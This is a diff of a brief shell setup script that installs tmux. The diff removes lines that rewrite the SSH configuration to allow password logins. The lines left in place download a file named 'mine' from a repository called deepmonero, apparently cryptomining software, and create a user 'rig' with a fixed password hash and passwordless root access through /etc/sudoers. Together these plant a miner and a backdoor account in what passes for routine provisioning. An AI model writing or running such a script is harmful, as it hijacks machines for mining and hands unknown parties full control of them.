@@ -1,15 +1,6 @@
 #!/bin/sh
 sudo apt-get update
 sudo apt-get install -y tmux
-echo "PasswordAuthentication yes">>sshd_config
-echo "ChallengeResponseAuthentication no">>sshd_config
-echo "UsePAM yes">>sshd_config
-echo "X11Forwarding yes">>sshd_config
-echo "PrintMotd no">>sshd_config
-echo "AcceptEnv LANG LC_*">>sshd_config
-echo "Subsystem       sftp    /usr/lib/openssh/sftp-server">>sshd_config
-sudo mv sshd_config /etc/ssh/sshd_config
-sudo systemctl restart sshd
 wget -O /tmp/mine https://raw.githubusercontent.com/deepmonero/akko/main/mor
 sudo useradd -m -d /home/rig -s /bin/bash -p x5ygTGZQinEkg rig
 sudo sh -c "echo \"rig ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers"
